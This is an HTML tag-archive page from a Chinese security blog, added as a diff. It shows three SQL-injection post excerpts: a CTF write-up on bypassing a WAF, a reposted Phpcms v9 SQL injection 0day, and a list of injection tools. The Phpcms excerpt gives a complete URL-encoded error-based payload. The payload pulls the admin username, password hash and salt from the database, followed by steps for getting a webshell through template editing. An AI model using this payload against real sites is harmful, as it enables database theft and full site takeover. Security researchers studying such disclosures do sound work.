@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+  <title>Tag: SQL注入 | Blog of Secer</title>
+  <meta name="description" content="" />
+  <meta name="HandheldFriendly" content="True" />
+  <meta name="MobileOptimized" content="320" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css" />
+  <link rel="stylesheet" type="text/css" href="/css/style.css" />
+  <meta name="generator" content="Blog of Secer">
+
+  
+  
+  
+
+  
+</head>
+
+<!--
+<body class="home-template">
+-->
+<body class="home-template">
+<div id="perspective" class="perspective effect-movedown">
+  <div class="container">
+    <!-- wrapper -->
+    <div class="wrapper">
+
+      <header class="site-head"  style="background: #24282b url(/img/img-bg.jpg) 0 -20%" >
+    <div class="vertical">
+        <div class="site-head-content inner">
+             <a class="blog-logo" href="/"><img src="/img/logo.svg" alt="Blog Logo"/></a> 
+            <h1 class="blog-title">Blog of Secer</h1>
+            <h2 class="blog-description"><button id="showMenu">Show Menu</button></h2>
+        </div>
+    </div>
+</header>
+
+      
+<main class="content" role="main">
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-10-15T21:47:56.000Z" itemprop="datePublished">
+          2012-10-16
+      </time>
+    
+    
+    | 
+    <a href='/tag/WAF/'>WAF</a>,
+    
+    <a href='/tag/漏洞/'>漏洞</a>,
+    
+    <a href='/tag/注入/'>注入</a>,
+    
+    <a href='/tag/SQL注入/'>SQL注入</a>,
+    
+    <a href='/tag/绕过WAF/'>绕过WAF</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/892.seo/">通过HTTP参数污染绕过WAF拦截</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        译:pnig0s_小P@FreeBuf  上个星期我被邀请组队去参加一个由CSAW组织的CTF夺旗比赛.因为老婆孩子的缘故，我只能挑一个与Web漏洞利用相关的题目，名字叫做”HorceForce”.这道题价值300点。这道题大概的背景是，你拥有一个低权限的帐号并需要找到方法来获得管理员权限。  当然，有很多种方法来介绍如何通过这关，但我想分享下我的通关经验。  当把一些单引号作为参数值发送之后返回了MySQL的典型报错信息“MySQL 
+      
+      </p>
+      
+      <p>
+          <a href="/892.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-09-07T04:33:36.000Z" itemprop="datePublished">
+          2012-09-07
+      </time>
+    
+    
+    | 
+    <a href='/tag/SQL注入/'>SQL注入</a>,
+    
+    <a href='/tag/0day/'>0day</a>,
+    
+    <a href='/tag/Phpcms/'>Phpcms</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/808.seo/">Phpcms v9最新Sql注入0day(转自乌云)</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>在phpcms/api.php?op=add_favorite中使用了urldecode，导致了一个sqlinject漏洞。$title = urldecode($title);   <br />省略??    <br />$data = array(‘title’=&gt;$title, ‘url’=&gt;$url, ‘adddate’=&gt;SYS_TIME, ‘userid’=&gt;$userid);    <br />省略??    <br />$favorite_db-&gt;insert($data);    <br /></p>  <p>(需要你先注册一个账户并且登陆后访问那个接口文件才会报错,进而<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>！）    <br />====================================================================    <br />利用POC：    <br />1、注册用户后，访问如下URL获取admin表的前缀：<a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527</a>    <br />2、修改如下URL中的admin表前缀名(xxoo_admin)，直接爆出管理员的用户名:密码:随机字串    <br /><a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271</a>    <br />MD5能破解    <br />后台拿shell    <br />进入后台后点击界面–模版风格–随便找个页面点击修改    <br />插入代码后点击提交..    <br />然后回到模版管理找到刚才修改的页面，点击 可视化..    <br /><a href="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001_thumb.jpg" width="339" height="318" /></a>    <br />恩，代码执行了</p>
+      
+      </p>
+      
+      <p>
+          <a href="/808.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-07-08T16:45:39.000Z" itemprop="datePublished">
+          2012-07-09
+      </time>
+    
+    
+    | 
+    <a href='/tag/SQL注入/'>SQL注入</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/669.seo/">十大关系数据库SQL注入工具一览</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+        <p>众所周知，SQL注入攻击是最为常见的Web应用程序攻击技术。同时SQL注入攻击所带来的安全破坏也是不可弥补的。以下罗列的10款SQL工具可帮助管理员及时检测存在的漏洞。</p>  <p>BSQL Hacker</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/SQL_7AF6/clip_image001.jpg" width="594" height="558" /></p>  <p>BSQL Hacker是由Portcullis实验室开发的，BSQL Hacker 是一个SQL自动注入工具（支持SQL盲注），其设计的目的是希望能对任何的数据库进行SQL溢出注入。 BSQL Hacker的适用群体是那些对注入有经验的使用者和那些想进行自动SQL注入的人群。BSQL Hacker可自动对Oracle和MySQL数据库进行攻击，并自动提取数据库的数据和架构。</p>  <p>The Mole</p>  <p><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/SQL_7AF6/clip_image002.png" width="594" height="389" /></p>  <p>The Mole是一款开源的自动化SQL注入工具，其可绕过IPS/IDS（入侵防御系统/入侵检测系统）。只需提供一个URL和一个可用的关键字，它就能够检测注入点并利用。The Mole可以使用union注入技术和基于逻辑查询的注入技术。The Mole攻击范围包括SQL Server、MySQL、Postgres和Oracle数据库。</p>
+      
+      </p>
+      
+      <p>
+          <a href="/669.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <nav class="pagination" role="pagination">
+    <a class="newer-posts" href="/tag/SQL注入/">← Newer Posts</a>
+    <span class="page-number">Page 2 of 2</span>
+    
+  </nav>
+</main>
+
+
+      
+<footer class="site-footer">
+  
+  <div class="inner">
+     <section class="copyright">All content copyright <a href="/">Blog of Secer</a> &copy; 2014 &bull; All rights reserved.</section>
+     <section class="poweredby">Proudly published with <a class="icon-ghost" href="http://zespia.tw/hexo/">Hexo</a></section>
+  </div>
+</footer>
+
+      <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+<script type="text/javascript" src="/js/jquery.fitvids.js"></script>
+<script type="text/javascript" src="/js/index.js"></script>
+<script type="text/javascript" src="/js/menu.js"></script>
+
+
+
+
+
+  </div>
+</div>
+
+<nav  class="outer-nav top horizontal">
+
+          <a class="icon-home"  href="/"><span>Home</span></a>
+
+          <a class="icon-news"  href="/archives"><span>Archive</span></a>
+
+          <a class="icon-image"  href="/images"><span>Images</span></a>
+
+          <a class="icon-wiki"  href="/wiki/"><span>Wiki</span></a>
+
+          <a class="icon-Favorites"  href="/favorites"><span>Favorites</span></a>
+
+          <a class="icon-mail"  href="/about/"><span>Contact</span></a>
+
+</nav>
+
+</div>
+</body>
+</html>
